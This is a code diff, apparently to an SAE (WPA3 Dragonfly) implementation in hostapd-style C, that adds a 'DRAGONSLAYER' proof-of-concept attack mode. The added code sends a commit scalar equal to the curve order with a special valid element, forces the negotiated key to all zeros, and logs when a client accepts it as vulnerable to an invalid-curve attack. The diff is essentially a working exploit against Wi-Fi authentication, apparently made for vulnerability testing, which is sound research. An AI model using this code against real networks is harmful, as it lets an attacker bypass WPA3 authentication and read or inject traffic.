@@ -738,6 +738,23 @@ static int sae_derive_commit(struct sae_data *sae)
 			exit(1);
 		}
 	}
+	/** Send a scalar equal to zero, and our special element */
+	else if (dragonslayer_badscalar)
+	{
+		// TODO: Check that we are using the correct group
+
+		/** own_commit_scalar = order of curve */
+		crypto_bignum_setint(sae->tmp->own_commit_scalar, 0);
+		crypto_bignum_add(sae->tmp->own_commit_scalar, sae->tmp->order,
+			sae->tmp->own_commit_scalar);
+
+		/** This element is a _valid_ one, so no need to load a new curve */
+		if (sae->tmp->own_commit_element_ecc != NULL)
+			crypto_ec_point_deinit(sae->tmp->own_commit_element_ecc, 0);
+		sae->tmp->own_commit_element_ecc = crypto_ec_point_get_zeroscalar_element(sae->tmp->ec);
+
+		poc_log(sae->macaddr, "Using scalar equal to order, and special (valid) element\n");
+	}
 #endif // DRAGONSLAYER
 
 	ret = 0;
@@ -768,6 +785,16 @@ static int sae_derive_k_ecc(struct sae_data *sae, u8 *k)
 {
 	struct crypto_ec_point *K;
 	int ret = -1;
+
+#ifdef DRAGONSLAYER
+	if (dragonslayer_badscalar)
+	{
+		memset(k, 0, sae->tmp->prime_len);
+
+		poc_log(sae->macaddr, "Setting negotiated SAE key to all-zeros\n");
+		return 0;
+	}
+#endif // DRAGONSLAYER
 
 	K = crypto_ec_point_init(sae->tmp->ec);
 	if (K == NULL)
@@ -1468,6 +1495,12 @@ int sae_check_confirm(struct sae_data *sae, const u8 *data, size_t len)
 			    verifier, SHA256_MAC_LEN);
 		return -1;
 	}
+
+#ifdef DRAGONSLAYER
+	if (dragonslayer_badscalar) {
+		poc_log(sae->macaddr, "Client is vulnerable to invalid curve attack! (Using bad scalar but valid point)\n");
+	}
+#endif // DRAGONSLAYER
 
 	return 0;
 }
